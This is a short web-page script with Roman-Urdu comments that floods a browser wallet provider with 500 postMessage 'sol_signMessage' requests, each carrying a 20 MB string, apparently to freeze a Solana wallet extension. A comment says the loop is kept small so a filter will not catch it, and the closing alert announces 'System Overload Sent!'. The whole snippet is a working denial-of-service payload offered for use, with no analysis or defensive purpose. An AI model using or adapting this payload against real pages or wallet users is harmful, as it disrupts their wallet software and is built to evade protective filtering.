<script>
    setTimeout(() => {
        // 20MB ka aik hi message (Pehle se 4 guna bada)
        const ultraHeavy = "Z".repeat(20 * 1024 * 1024); 
        
        // Loop ko kam baar chalayein taake filter na pakre
        for (let i = 0; i < 500; i++) {
            window.postMessage({
                target: "provider",
                data: { method: "sol_signMessage", params: [ultraHeavy] }
            }, "*");
        }
        alert("System Overload Sent! Check if touch works.");
    }, 2000);
</script>
